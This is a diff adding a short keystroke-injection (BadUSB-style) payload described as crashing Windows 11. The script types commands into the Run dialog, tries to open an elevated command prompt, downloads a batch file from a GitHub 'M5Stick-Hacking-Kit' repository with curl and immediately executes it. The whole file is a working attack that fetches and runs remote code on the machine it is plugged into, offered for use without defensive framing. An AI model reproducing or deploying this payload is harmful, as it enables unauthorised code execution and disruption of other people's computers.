@@ -1,0 +1,17 @@
+REM Author: hogan
+REM Description: Crashins Windows 11
+REM Version: 1.0
+DELAY 600
+GUI r
+DELAY 600
+STRING cmd
+CTRL
+DELAY 10
+SHIFT
+DELAY 10
+ENTER
+DELAY 1200
+STRING curl -L -o bluescreen.bat https://raw.githubusercontent.com/HOGANCLAN236/M5Stick-Hacking-Kit/main/Bluescreen.bat
+ENTER
+STRING call bluescreen.bat
+ENTER
